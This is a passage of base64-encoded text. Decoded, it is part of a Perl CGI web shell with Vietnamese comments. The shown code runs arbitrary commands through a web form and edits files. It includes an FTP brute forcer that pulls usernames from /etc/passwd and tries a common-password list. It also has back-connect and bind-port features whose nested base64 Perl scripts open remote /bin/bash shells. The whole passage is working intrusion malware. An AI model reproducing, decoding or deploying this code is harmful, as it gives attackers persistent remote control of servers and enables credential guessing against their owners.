VRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQlyZXR1cm4gJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFuZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRoZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJbXkgJHJlc3VsdD0iIjsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kIDwvcnVuPjxicj48dGV4dGFyZWEgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsNCgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQ0KCQkkUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSI7DQoJCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQ0KCXsNCgkJJHJlc3VsdCAuPSAgJlNhdmVGaWxlRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSRyZXN1bHQgLj0mUnVuQ21kOw0KCX0NCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIHJ1biBjb21tYW5kDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCnN1YiBSdW5DbWQNCnsNCglteSAkcmVzdWx0PSIiOw0KCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCglpZighJFdpbk5UKQ0KCXsNCgkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KCX0NCglpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJew0KCQkkfD0xOw0KCQkkQ29tbWFuZCAuPSAiIHwiOw0KCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCgkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQl7DQoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsNCgkJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoIiRfXG4iKTsNCgkJfQ0KCQkkfD0wOw0KCX0NCgllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMNCgl7DQoJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoJyRDb21tYW5kJyk7DQoJfQ0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZvcm0gU2F2ZSBGaWxlIA0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlRm9ybQ0Kew0KCW15ICRyZXN1bHQgPSIiOw0KCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOw0KCW15ICRmaWxlPSZ0cmltKCRSdW5Db21tYW5kKTsNCgkkc2F2ZT0nPGJyPjxpbnB1dCBuYW1lPSJhIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzYXZlIiBjbGFzcz0ic3VibWl0IiA+JzsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsNCglteSAkZGlyPSI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImd1aSIpLiI8L3NwYW4+IjsNCglpZigtdyAkRmlsZSkNCgl7DQoJCSRyb3dzPSIyMyINCgl9ZWxzZQ0KCXsNCgkJJG1zZz0iPGJyPjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7JyA+IFBlcm1pc3Npb24gZGVuaWVkITxmb250Pjxicj4iOw0KCQkkcm93cz0iMjAiDQoJfQ0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCgkkcmVhZD0oJFdpbk5UKT8idHlwZSI6Imxlc3MiOw0KCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7DQoJJHJlc3VsdCAuPSAgPDxFTkQ7DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoNCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KCSRQcm9tcHQNCgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPg0KCTxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQoJPGJyPkNvbW1hbmQ6IDxydW4+ICRSdW5Db21tYW5kIDwvcnVuPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cNCgk8YnI+PHRleHRhcmVhIGlkPSJkYXRhIiBuYW1lPSJkYXRhIiBjb2xzPSIkY29scyIgcm93cz0iJHJvd3MiIHNwZWxsY2hlY2s9ImZhbHNlIj4NCkVORA0KCQ0KCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgU2F2ZSBGaWxlDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgU2F2ZUZpbGUoJCkNCnsNCglteSAkRGF0YT0gc2hpZnQgOw0KCW15ICRGaWxlPSBzaGlmdDsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kRmlsZTsNCglpZihvcGVuKEZJTEUsICI+JEZpbGUiKSkNCgl7DQoJCWJpbm1vZGUgRklMRTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJcmV0dXJuIDE7DQoJfWVsc2UNCgl7DQoJCXJldHVybiAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyIEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlckZvcm0NCnsNCglteSAkcmVzdWx0PSIiOw0KCSRyZXN1bHQgLj0gPDxFTkQ7DQoNCjx0YWJsZT4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjPGJyPg0KU2ltcGxlIEZUUCBicnV0ZSBmb3JjZXI8YnI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPg0KRU5EDQpjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOw0KJHJlc3VsdCAuPSA8PCdFTkQnOw0KPC90ZXh0YXJlYT48L3RkPg0KPHRkPg0KDQpQYXNzOjxicj4NCjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MNCjEyMyFAIw0KMTIzYWRtaW4NCjEyM2FiYw0KMTIzNDU2YWRtaW4NCjEyMzQ1NTQzMjENCjEyMzQ0MzIxDQpwYXNzMTIzDQphZG1pbg0KYWRtaW5jcA0KYWRtaW5pc3RyYXRvcg0KbWF0a2hhdQ0KcGFzc2FkbWluDQpwQHNzd29yZA0KcEBzc3cwcmQNCnBhc3N3b3JkDQoxMjM0NTYNCjEyMzQ1NjcNCjEyMzQ1Njc4DQoxMjM0NTY3ODkNCjEyMzQ1Njc4OTANCjExMTExMQ0KMDAwMDAwDQoyMjIyMjINCjMzMzMzMw0KNDQ0NDQ0DQo1NTU1NTUNCjY2NjY2Ng0KNzc3Nzc3DQo4ODg4ODgNCjk5OTk5OQ0KMTIzMTIzDQoyMzQyMzQNCjM0NTM0NQ0KNDU2NDU2DQo1Njc1NjcNCjY3ODY3OA0KNzg5Nzg5DQoxMjMzMjENCjQ1NjY1NA0KNjU0MzIxDQo3NjU0MzIxDQo4NzY1NDMyMQ0KOTg3NjU0MzIxDQowOTg3NjU0MzIxDQphZG1pbjEyMw0KYWRtaW4xMjM0NTYNCmFiY2RlZg0KYWJjYWJjDQohQCMhQCMNCiFAIyQlXg0KIUAjJCVeJiooDQohQCMkJCNAIQ0KYWJjMTIzDQphbmh5ZXVlbQ0KaWxvdmV5b3U8L3RleHRhcmVhPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4NCg0KPG9wdGlvbj4wPC9vcHRpb24+DQo8b3B0aW9uPjE8L29wdGlvbj4NCjxvcHRpb24+Mjwvb3B0aW9uPg0KDQo8b3B0aW9uPjM8L29wdGlvbj4NCjwvc2VsZWN0PiANCjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzdWJtaXQiIHZhbHVlPSJCcnV0ZSBGb3JjZXIiLz48L3RkPjwvdHI+DQo8L2Zvcm0+DQo8L3RhYmxlPg0KRU5EDQpyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXINCnsNCglteSAkcmVzdWx0PSIiOw0KCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsNCglpZigkaW57J3VzZXInfSBlcSAiIikNCgl7DQoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJdXNlIE5ldDo6RlRQOyANCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsNCgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsNCgkJY2hvbXAoQHVzZXIpOw0KCQljaG9tcChAcGFzcyk7DQoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOw0KCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpDQoJCXsNCgkJCWlmKCEoJHVzZXJuYW1lIGVxICIiKSkNCgkJCXsNCgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpDQoJCQkJew0KCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkNvdWxkIG5vdCBjb25uZWN0IHRvICRTZXJ2ZXJOYW1lXG4iOyANCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQ0KCQkJCQl7DQoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsNCgkJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQkJCWJyZWFrOw0KCQkJCQl9DQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpDQoJCQkJCXsNCgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pKTsNCgkJCQkJfQ0KCQkJCQkkZnRwLT5xdWl0KCk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCSRyZXN1bHQgLj0gIlxuPGJyPj09PT09PT09PT0+Pj4+Pj4+Pj4+IEZpbmlzaGVkIDw8PDw8PDw8PDw9PT09PT09PT09PGJyPlxuIjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCYWNrQmluZEZvcm0NCnsNCglyZXR1cm4gPDxFTkQ7DQoJPGJyPjxicj4NCg0KCTx0YWJsZT4NCgk8dHI+DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoJPHRkPkJhY2tDb25uZWN0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4NCgkgUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjciIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSI4MCIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij48L3RkPg0KDQoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2xpZW50IGxpc3RlbiBiZWZvcmUgY29ubmVjdCBiYWNrIQ0KCTxicj5bK10gVHJ5IGNoZWNrIHlvdXIgUG9ydCB3aXRoIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSJodHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy8iPmh0dHA6Ly93d3cuY2FueW91c2VlbWUub3JnLzwvYT4NCgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPg0KDQoJPGJyPjxicj4NCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4NCg0KCTx0ZD4gUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iMTQxMiIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JpJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij4NCg0KCSBQYXNzd29yZDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJiaW5kcGFzcyIgdmFsdWU9IlRISUVVR0lBQlVPTiI+PC90ZD4NCgk8dGQ+PGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iQmluZCI+PC90ZD4NCgk8L2Zvcm0+DQoJPC90cj4NCgk8dHI+DQoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQ0KCTxicj5bK10gVHJ5IGNvbW1hbmQ6IDxydW4+bmMgJEVOVnsnU0VSVkVSX0FERFInfSA8c3BhbiBpZD0iYmkiPjE0MTI8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+PGJyPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IHVzZSBwZXJsDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmQNCnsNCgl1c2UgTUlNRTo6QmFzZTY0Ow0KCXVzZSBTb2NrZXQ7CQ0KCSRiYWNrcGVybD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1NVODZPbE52WTJ0bGREc05DaVJUYUdWc2JBazlJQ0l2WW1sdUwySmhjMmdpT3cwS0pFRlNSME05UUVGU1IxWTdEUXAxYzJVZ1UyOWphMlYwT3cwS2RYTmxJRVpwYkdWSVlXNWtiR1U3RFFwemIyTnJaWFFvVTA5RFMwVlVMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLU0J2Y2lCa2FXVWdjSEpwYm5RZ0lsc3RYU0JWYm1GaWJHVWdkRzhnVW1WemIyeDJaU0JJYjNOMFhHNGlPdzBLWTI5dWJtVmpkQ2hUVDBOTFJWUXNJSE52WTJ0aFpHUnlYMmx1S0NSQlVrZFdXekZkTENCcGJtVjBYMkYwYjI0b0pFRlNSMVpiTUYwcEtTa2diM0lnWkdsbElIQnlhVzUwSUNKYkxWMGdWVzVoWW14bElIUnZJRU52Ym01bFkzUWdTRzl6ZEZ4dUlqc05DbkJ5YVc1MElDSkRiMjV1WldOMFpXUWhJanNOQ2xOUFEwdEZWQzArWVhWMGIyWnNkWE5vS0NrN0RRcHZjR1Z1S0ZOVVJFbE9MQ0FpUGlaVFQwTkxSVlFpS1RzTkNtOXdaVzRvVTFSRVQxVlVMQ0krSmxOUFEwdEZWQ0lwT3cwS2IzQmxiaWhUVkVSRlVsSXNJajRtVTA5RFMwVlVJaWs3RFFwd2NtbHVkQ0FpTFMwOVBTQkRiMjV1WldOMFpXUWdRbUZqYTJSdmIzSWdQVDB0TFNBZ1hHNWNiaUk3RFFwemVYTjBaVzBvSW5WdWMyVjBJRWhKVTFSR1NVeEZPeUIxYm5ObGRDQlRRVlpGU0VsVFZDQTdaV05vYnlBbld5dGRJRk41YzNSbGJXbHVabTg2SUNjN0lIVnVZVzFsSUMxaE8yVmphRzg3WldOb2J5QW5XeXRkSUZWelpYSnBibVp2T2lBbk95QnBaRHRsWTJodk8yVmphRzhnSjFzclhTQkVhWEpsWTNSdmNuazZJQ2M3SUhCM1pEdGxZMmh2T3lCbFkyaHZJQ2RiSzEwZ1UyaGxiR3c2SUNjN0pGTm9aV3hzSWlrN0RRcGpiRzl6WlNCVFQwTkxSVlE3IjsNCgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lRaElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOw0KDQoJJENsaWVudEFkZHIgPSAkaW57J2NsaWVudGFkZHInfTsNCgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7DQoJaWYoJENsaWVudFBvcnQgZXEgMCkNCgl7DQoJCXJldHVybiAmQmFja0JpbmRGb3JtOw0KCX1lbHNpZighJENsaWVudEFkZHIgZXEgIiIpDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7DQoJCWlmKC13ICIvdG1wLyIpDQoJCXsNCgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJDQoJCX1lbHNlDQoJCXsNCgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7DQoJCX0NCgkJb3BlbihGSUxFLCAiPiRGaWxlIik7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXN5c3RlbSgicGVybCBiYWNrY29ubmVjdC5wbCAkQ2xpZW50QWRkciAkQ2xpZW50UG9ydCIpOw0KCQl1bmxpbmsoJEZpbGUpOw0KCQlleGl0IDA7DQoJfWVsc2UNCgl7DQoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJpbmRwZXJsKTsNCgkJaWYoLXcgIi90bXAiKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iaW5kcG9ydC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmluZHBvcnQucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX0NCn0NC